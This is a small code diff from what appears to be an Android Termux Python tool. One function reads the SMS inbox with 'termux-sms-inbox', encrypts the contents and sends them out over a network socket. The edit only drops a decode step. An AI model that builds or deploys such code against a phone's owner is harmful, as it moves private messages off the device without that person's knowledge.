@@ -57,7 +57,7 @@ def incomming_texts():
         TextsRaw2 = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
 
         if(TextsRaw1 != TextsRaw2):
-            Texts = encrypt(bytes.decode(TextsRaw2.communicate()[0]))
+            Texts = encrypt(TextsRaw2.communicate()[0])
             SOCKET2.send(Texts)
 
 
